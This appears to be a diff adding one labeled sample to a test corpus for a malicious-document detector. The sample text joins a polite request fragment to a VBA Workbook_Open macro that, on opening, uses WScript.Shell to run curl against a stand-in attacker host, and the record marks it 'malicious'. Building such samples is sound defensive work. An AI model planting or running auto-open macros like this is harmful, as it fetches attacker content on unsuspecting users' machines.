@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::72::paraphrase-variations::6",
+  "base_sample_id": "exp::document-office::72",
+  "generator_id": "paraphrase-variations",
+  "generator_version": "1.0.0",
+  "seed": -745934699,
+  "content": "I would appreciate it if you could private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "e8e9766842ed0e94ccf44d6e49411f6bce3400273a878826c37d17e697b9b3e3",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "paraphrase:synonym-formal",
+  "difficulty": "advanced"
+}
